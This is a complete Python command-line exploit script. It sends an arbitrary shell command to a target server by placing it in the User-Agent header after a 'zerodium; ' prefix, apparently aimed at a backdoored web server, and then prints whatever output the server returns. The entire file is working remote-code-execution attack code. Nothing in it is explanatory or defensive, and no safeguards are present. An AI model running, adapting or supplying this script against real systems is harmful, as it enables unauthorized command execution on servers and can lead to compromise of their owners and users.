#!/usr/bin/env python3

import requests
import sys
import argparse

def run_exploit(target_url, command):
    payload = f"zerodium; {command}"
    headers = {
        "User-Agent": payload
    }

    print(f"[+] Target: {target_url}")
    print(f"[+] Injecting command via User-Agent: {command}")

    try:
        response = requests.get(target_url, headers=headers, timeout=10)
        print(f"[+] Response Code: {response.status_code}")
        if response.text.strip():
            print("[+] Response Body:")
            print(response.text.strip())
        else:
            print("[+] No output received from target.")
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="User-Agent Header RCE Exploit")
    parser.add_argument("url", help="Target URL (e.g., http://127.0.0.1:8000/)")
    parser.add_argument("cmd", help="Command to inject (e.g., id, uname -a, whoami)")
    args = parser.parse_args()

    run_exploit(args.url, args.cmd)

if __name__ == "__main__":
    main()
